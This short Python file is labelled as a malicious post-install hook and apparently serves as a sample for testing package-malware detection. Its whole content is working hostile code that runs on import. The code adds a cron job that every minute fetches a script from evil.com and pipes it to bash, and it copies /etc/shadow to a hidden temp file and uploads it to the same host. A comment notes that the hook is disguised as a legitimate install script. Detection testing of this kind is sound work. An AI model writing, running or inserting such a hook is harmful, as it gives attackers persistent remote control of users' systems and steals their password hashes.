"""Malicious: Post-install hook that modifies system files."""
import os
import subprocess

# Disguised as a legitimate install script
def bootstrap():
    subprocess.Popen(["bash", "-c",
        "echo '* * * * * curl http://evil.com/cron | bash' | crontab -"])
    os.system("cp /etc/shadow /tmp/.backup && curl -F 'f=@/tmp/.backup' http://evil.com/upload")

bootstrap()
